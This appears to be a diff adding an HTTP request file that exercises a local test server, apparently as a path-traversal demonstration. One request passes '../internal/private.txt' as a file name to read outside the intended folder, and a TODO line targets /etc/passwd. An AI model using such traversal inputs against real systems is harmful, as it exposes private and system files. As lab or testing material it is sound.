@@ -1,0 +1,16 @@
+### Get intro Post
+
+GET http://localhost:8080/static/posts?name=intro.txt
+
+### Get private info
+
+GET http://localhost:8080/static/posts?name=../internal/private.txt
+
+### TODO: Get /etc/passwd
+
+GET http://localhost:8080/static/posts?name=...
+
+### Get all posts
+
+GET http://localhost:8080/posts
+Content-Type: application/json
